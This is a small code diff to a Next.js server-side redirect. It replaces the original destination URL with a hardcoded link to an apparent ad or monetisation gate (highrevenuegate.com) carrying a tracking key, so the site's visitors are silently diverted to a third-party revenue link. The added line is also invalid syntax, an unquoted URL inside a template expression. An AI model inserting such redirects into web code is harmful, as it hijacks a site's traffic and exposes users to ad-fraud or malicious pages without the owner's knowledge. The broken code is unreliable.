@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://mesic-reference.000webhostapp.com/graphql./` + encodeURI(path as string)
+					https://www.highrevenuegate.com/fzu0ia7d?key=3011104b81184d3b8c0c268a7077f1aa/
 				}`,
 			},
 		};
